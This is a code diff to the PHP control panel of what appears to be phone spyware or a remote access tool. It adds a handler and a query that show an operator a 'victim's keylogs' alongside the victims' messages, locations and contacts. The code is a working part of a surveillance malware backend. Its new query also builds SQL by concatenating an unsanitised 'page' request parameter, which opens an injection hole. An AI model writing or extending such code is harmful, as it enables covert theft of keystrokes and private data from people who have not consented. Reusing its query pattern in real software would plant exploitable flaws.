@@ -8,6 +8,7 @@ use Server\Controller\Base;
 use Server\Model\Contact;
 use Server\Model\Image;
 use Server\Model\InstalledApp;
+use Server\Model\Keylog;
 use Server\Model\Location;
 use Server\Model\Message;
 use Server\Model\Notification;
@@ -243,6 +244,36 @@ class ControlPanel extends Base
             ]
         );
     }
+
+    /**
+     * Get victim's keylogs
+     */
+    public function keylogs(): void
+    {
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
+
+        $keylogs = $this->getKeylogs($_GET['client']);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/keylogger.php',
+            [
+                'webSocketID' => $webSocketID,
+                'keylogs' => $keylogs,
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("KEYLOG")
+            ]
+        );
+    }
+
 
     /**
      * Get victim's notifications
@@ -843,6 +874,36 @@ class ControlPanel extends Base
         }
 
         return $installedApps;
+    }
+
+     /**
+     * Get victim's keylogs
+     * @param int $victimID
+     * 
+     * @return array<Image>
+     */
+    private function getKeylogs(int $victimID): array
+    {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
+        $images = [];
+        $query = "SELECT * FROM KEYLOG WHERE client_id=? ORDER BY id DESC LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
+        $rows = $this->database->select($query, [$victimID]);
+
+        foreach ($rows as $row) {
+            $images[] = new Keylog(
+                $row['id'],
+                $row['client_id'],
+                $row['text'],
+                $row['timestamp']
+            );
+        }
+
+        return $images;
     }
 
      /**
